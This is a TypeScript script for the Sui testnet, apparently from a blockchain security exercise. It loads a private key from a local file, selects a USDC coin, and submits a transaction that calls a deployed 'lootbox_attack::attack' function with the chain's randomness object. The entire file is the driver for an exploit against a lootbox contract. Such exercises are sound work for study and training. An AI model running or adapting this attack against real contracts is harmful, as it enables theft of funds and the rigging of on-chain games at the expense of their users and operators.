import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);

const suiClient = new SuiGrpcClient({
  network: 'testnet',
  baseUrl: 'https://fullnode.testnet.sui.io:443',
});

(async () => {
  const EXPLOIT_PACKAGE_ID = "0x04e4ec573c30b0e82c9712379bdb70150ae3e4a10601ad675df9319de8db65af";
  const COST = 12000000n;

  const owner = keypair.toSuiAddress();
  console.log("Using address:", owner);

  const { balances } = await suiClient.core.listBalances({ owner });
  const usdcBalance = balances.find((b: any) => b.coinType.endsWith("::usdc::USDC"));

  if (!usdcBalance) {
    throw new Error("No USDC balance found.");
  }

  const USDC_TYPE = usdcBalance.coinType;
  console.log("Detected USDC type:", USDC_TYPE);

  const { objects } = await suiClient.core.listCoins({
    owner,
    coinType: USDC_TYPE,
  });

  const coin = objects.find((c: any) => BigInt(c.balance) >= COST);

  if (!coin) {
    throw new Error(`No single USDC coin with at least ${COST} balance found.`);
  }

  console.log("Using USDC coin:", coin.objectId, "balance:", coin.balance);

  const tx = new Transaction();

  const [paymentCoin] = tx.splitCoins(
    tx.object(coin.objectId),
    [tx.pure.u64(COST)]
  );

  tx.moveCall({
    target: `${EXPLOIT_PACKAGE_ID}::lootbox_attack::attack`,
    arguments: [paymentCoin, tx.object.random()],
  });

  console.log("Sending lootbox exploit transaction...");

  const result = await suiClient.signAndExecuteTransaction({
    signer: keypair,
    transaction: tx,
  });

  console.log("Transaction result:");
  console.log(JSON.stringify(result, null, 2));
})();